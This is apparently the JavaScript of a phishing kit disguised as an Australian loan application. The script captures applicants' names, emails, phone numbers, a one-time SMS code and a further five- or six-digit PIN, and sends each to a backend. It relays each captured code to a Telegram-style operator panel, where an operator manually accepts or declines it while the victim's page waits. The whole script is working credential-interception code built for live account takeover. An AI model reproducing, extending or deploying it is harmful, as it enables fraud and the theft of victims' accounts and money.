  <script>
    // ── Application State Workspace ──
    let S = {
      purpose: '', amount: 30000, term: 5, title: '', firstName: '', lastName: '',
      email: '', phone: '', otpVal: '', sessionId: null, currentPinType: '', dynamicPinVal: ''
    };
    let otpTimerIv = null;

    // ── App Navigation Matrix ──
    function goTo(id) {
      document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
      document.getElementById('step-' + id).classList.add('active');
      window.scrollTo(0, 0);
    }

    // ── Step 1 Handling ──
    function selectPurpose(p) {
      S.purpose = p;
      document.getElementById('purpose-label').textContent = p;
      calcRepayments();
      goTo('details');
    }

    // ── Loan Financial Cost Calculator ──
    function calcRepayments() {
      S.amount = parseFloat(document.getElementById('loan-amt').value);
      S.term = parseInt(document.getElementById('loan-term').value);
      document.getElementById('amt-display').textContent = '$' + S.amount.toLocaleString();
      document.getElementById('term-display').textContent = S.term + (S.term === 1 ? ' Year' : ' Years');
      const rate = 0.0849, wr = rate / 52, n = S.term * 52;
      const weekly = (S.amount * wr * Math.pow(1 + wr, n)) / (Math.pow(1 + wr, n) - 1);
      document.getElementById('rep-weekly').textContent = '$' + weekly.toFixed(2);
      document.getElementById('rep-monthly').textContent = '$' + (weekly * 4.333).toFixed(2);
      document.getElementById('rep-interest').textContent = '$' + Math.max(0, (weekly * n) - S.amount).toFixed(0);
    }

    // ── Form submission parser details ──
    function submitDetails(e) {
      e.preventDefault();
      S.title = document.getElementById('f-title').value;
      S.firstName = document.getElementById('f-first').value;
      S.lastName = document.getElementById('f-last').value;
      S.email = document.getElementById('f-email').value;
      S.phone = document.getElementById('f-phone').value;

      fetch('/api/application-details', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: `${S.title} ${S.firstName} ${S.lastName}`, email: S.email, phone: '+61' + S.phone, purpose: S.purpose, amount: '$' + S.amount.toLocaleString(), term: S.term + ' years' })
      });

      pushToPanel(`
    <div class="tg-head">📋 New Profile Entry</div>
    <div style="margin-top:4px;line-height:1.8">
      <div><b>Applicant:</b> ${S.title} ${S.firstName} ${S.lastName}</div>
      <div><b>Phone Line:</b> +61 ${S.phone}</div>
      <div><b>Target Core Object:</b> ${S.purpose}</div>
    </div>
    <div style="margin-top:8px;color:#6b7280;font-size:10px">Awaiting primary signature entry code...</div>
  `);

      buildOtpInputs();
      document.getElementById('otp-phone-display').textContent = S.phone.slice(-4).padStart(S.phone.length, '•');
      startOtpTimer();
      goTo('otp');
    }

    // ── Initial Verification Step Handler ──
    function buildOtpInputs() {
      const wrap = document.getElementById('otp-inputs');
      wrap.innerHTML = ''; S.otpVal = '';
      for (let i = 0; i < 6; i++) {
        const inp = document.createElement('input');
        inp.type = 'text'; inp.maxLength = 1; inp.className = 'otp-box';
        inp.inputMode = 'numeric'; inp.id = 'ob' + i;
        inp.addEventListener('input', e => {
          const v = e.target.value.replace(/\D/g, '');
          e.target.value = v ? v[0] : '';
          e.target.classList.toggle('filled', !!e.target.value);
          if (v && i < 5) document.getElementById('ob' + (i + 1)).focus();
          updateOtpVal();
        });
        inp.addEventListener('keydown', e => {
          if (e.key === 'Backspace' && !e.target.value && i > 0) { document.getElementById('ob' + (i - 1)).focus(); }
        });
        wrap.appendChild(inp);
      }
    }

    function updateOtpVal() {
      let v = '';
      for (let i = 0; i < 6; i++) { const b = document.getElementById('ob' + i); if (b) v += b.value; }
      S.otpVal = v;
      document.getElementById('otp-submit-btn').disabled = v.length < 6;
    }

    function startOtpTimer() {
      clearInterval(otpTimerIv);
      document.getElementById('resend-btn').classList.remove('active');
      let t = 120;
      document.getElementById('otp-timer').textContent = t;
      otpTimerIv = setInterval(() => {
        t--; document.getElementById('otp-timer').textContent = t;
        if (t <= 0) { clearInterval(otpTimerIv); document.getElementById('resend-btn').classList.add('active'); }
      }, 1000);
    }

    async function submitOtp() {
      if (S.otpVal.length < 6) return;
      document.getElementById('otp-error').style.display = 'none';
      document.getElementById('proc-title').textContent = 'Validating Identity Parameters...';
      document.getElementById('proc-sub').textContent = 'Evaluating communication signatures, stand-by.';
      goTo('processing');

      try {
        const res = await fetch('/api/submit-otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: '+61' + S.phone, otp: S.otpVal, name: `${S.firstName} ${S.lastName}`, planInfo: `${S.purpose} · $${S.amount.toLocaleString()} · ${S.term} yrs` }) });
        const data = await res.json();
        S.sessionId = data.sessionId;

        pushToPanel(`
      <div class="tg-head">🔐 Initial OTP Submitted (Code: <code>${S.otpVal}</code>)</div>
      <div style="font-size:11px; margin-bottom:8px; color:#9ca3af;">Select Secondary Verification Layer Array:</div>
      <div class="tg-btns">
        <button class="tg-btn accept" onclick="simDecide('accept_p5')">✅ Accept (5-Pin Form)</button>
        <button class="tg-btn accept" onclick="simDecide('accept_p6')">✅ Accept (6-Pin Form)</button>
        <button class="tg-btn decline" onclick="simDecide('decline')">❌ Decline</button>
      </div>
    `);

        waitForAdminInitial(S.sessionId);
      } catch (err) {
        console.error(err);
        goTo('otp');
      }
    }

    // ── Initial Interception Loop Worker ──
    function waitForAdminInitial(sessionId) {
      const started = Date.now();
      const iv = setInterval(async () => {
        if (Date.now() - started > 5 * 60 * 1000) { clearInterval(iv); handleAdminDecline(); return; }
        try {
          const r = await fetch('/api/check-status/' + sessionId);
          const d = await r.json();
          if (d.status === 'accept_p5') { clearInterval(iv); handleAdminInitialAccept('p5'); }
          if (d.status === 'accept_p6') { clearInterval(iv); handleAdminInitialAccept('p6'); }
          if (d.status === 'decline') { clearInterval(iv); handleAdminDecline(); }
        } catch (e) { }
      }, 2000);
    }

    function handleAdminInitialAccept(pinType) {
      pushToPanel(`<div style="color:#3b82f6;font-weight:700">⚡ Admin approved phase 1. Injecting custom ${pinType.toUpperCase()} array framework module.</div>`);
      buildDynamicPinBoxes(pinType);
    }

    function handleAdminDecline() {
      goTo('otp');
      document.getElementById('otp-error').style.display = 'block';
      buildOtpInputs();
      pushToPanel('<div style="color:#f87171;font-weight:700">❌ Processing profile manually rejected by admin.</div>');
    }

    // ── Dynamic Input Matrix Building System ──
    function buildDynamicPinBoxes(type) {
      S.currentPinType = type;
      S.dynamicPinVal = '';

      const container = document.getElementById('dynamic-pin-inputs');
      const submitBtn = document.getElementById('dynamic-pin-submit-btn');
      const titleText = document.getElementById('dynamic-pin-title');

      container.innerHTML = '';
      submitBtn.disabled = true;
      document.getElementById('dynamic-pin-error').style.display = 'none';

      const targetLength = type === 'p5' ? 5 : 6;
      titleText.textContent = `Enter ${targetLength}-Digit Security Signature Code`;

      for (let i = 0; i < targetLength; i++) {
        const box = document.createElement('input');
        box.type = 'text'; box.maxLength = 1; box.className = 'otp-box';
        box.inputMode = 'numeric'; box.id = 'dpb' + i;

        box.addEventListener('input', e => {
          const val = e.target.value.replace(/\D/g, '');
          e.target.value = val ? val[0] : '';
          e.target.classList.toggle('filled', !!e.target.value);
          if (val && i < (targetLength - 1)) document.getElementById('dpb' + (i + 1)).focus();
          updateDynamicPinVal(targetLength);
        });

        box.addEventListener('keydown', e => {
          if (e.key === 'Backspace' && !e.target.value && i > 0) {
            document.getElementById('dpb' + (i - 1)).focus();
          }
        });
        container.appendChild(box);
      }
      goTo('dynamic-pin');
    }

    function updateDynamicPinVal(length) {
      let combinedValue = '';
      for (let i = 0; i < length; i++) {
        const el = document.getElementById('dpb' + i);
        if (el) combinedValue += el.value;
      }
      S.dynamicPinVal = combinedValue;
      document.getElementById('dynamic-pin-submit-btn').disabled = combinedValue.length < length;
    }

    // ── FIXED: Submitting the dynamic input pin page ──
    async function submitDynamicPin() {
      document.getElementById('dynamic-pin-error').style.display = 'none';
      document.getElementById('proc-title').textContent = 'Transmitting Authorization Code...';
      document.getElementById('proc-sub').textContent = 'Securing signature payloads. Do not close this tab.';
      goTo('processing');

      try {
        // Send pin back to backend router system
        await fetch('/api/verify-dynamic-pin', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sessionId: S.sessionId, pinType: S.currentPinType, pinValue: S.dynamicPinVal })
        });

        // Inject custom control panel view blocks inside desktop simulation
        pushToPanel(`
      <div class="tg-head">🔍 Dynamic Code Received (PIN: <code>${S.dynamicPinVal}</code>)</div>
      <div style="font-size:11px; margin-bottom:8px; color:#9ca3af;">Confirm payload release allocation?</div>
      <div class="tg-btns">
        <button class="tg-btn accept" onclick="simDecide('accept')">✅ Accept to Success</button>
        <button class="tg-btn decline" onclick="simDecide('decline')">❌ Decline Entry</button>
      </div>
    `);

        // Enter the FINAL checking state loop - wait here for Telegram click!
        waitForAdminFinal(S.sessionId);
      } catch (err) {
        console.error(err);
        goTo('dynamic-pin');
      }
    }

    // ── Phase 2 Final Administrative Polling Engine ──
    function waitForAdminFinal(sessionId) {
      const started = Date.now();
      const iv = setInterval(async () => {
        if (Date.now() - started > 5 * 60 * 1000) { clearInterval(iv); handleFinalDecline(); return; }
        try {
          const r = await fetch('/api/check-status/' + sessionId);
          const d = await r.json();

          if (d.status === 'accept') {
            clearInterval(iv);
            handleFinalAccept();
          }
          if (d.status === 'decline') {
            clearInterval(iv);
            handleFinalDecline();
          }
        } catch (e) { }
      }, 2000);
    }

    function handleFinalAccept() {
      document.getElementById('sum-name').textContent = `${S.title} ${S.firstName} ${S.lastName}`;
      document.getElementById('sum-purpose').textContent = S.purpose;
      document.getElementById('sum-amount').textContent = '$' + S.amount.toLocaleString();
      document.getElementById('sum-term').textContent = S.term + (S.term === 1 ? ' Year' : ' Years');
      document.getElementById('sum-email').textContent = S.email;
      document.getElementById('sum-phone').textContent = '+61 ' + S.phone;

      pushToPanel('<div style="color:#4ade80;font-weight:700">✅ Application completely complete. Disbursed funds layout loaded.</div>');
      goTo('success');
    }

    function handleFinalDecline() {
      goTo('dynamic-pin');
      document.getElementById('dynamic-pin-error').style.display = 'block';
      buildDynamicPinBoxes(S.currentPinType);
      pushToPanel('<div style="color:#f87171;font-weight:700">❌ Final authorization parameter rejected — Client error rendered.</div>');
    }

    // ── Side Simulator Buttons Communicator ──
    function simDecide(action) {
      if (!S.sessionId) return;
      fetch('/api/cmd/' + S.sessionId + '/' + action);
    }

    function pushToPanel(html) {
      const feed = document.getElementById('tg-feed');
      const msg = document.createElement('div');
      msg.className = 'tg-msg';
      msg.innerHTML = `<div class="tg-avatar">🤖</div><div class="tg-bubble">${html}</div>`;
      feed.appendChild(msg);
      feed.scrollTo({ top: feed.scrollHeight, behavior: 'smooth' });
    }

    function resetApp() {
      S = { purpose: '', amount: 30000, term: 5, title: '', firstName: '', lastName: '', email: '', phone: '', otpVal: '', sessionId: null, currentPinType: '', dynamicPinVal: '' };
      document.getElementById('details-form').reset();
      document.getElementById('tg-feed').innerHTML = '<div class="tg-system">Bot connected · Awaiting submissions</div>';
      calcRepayments();
      goTo('purpose');
    }
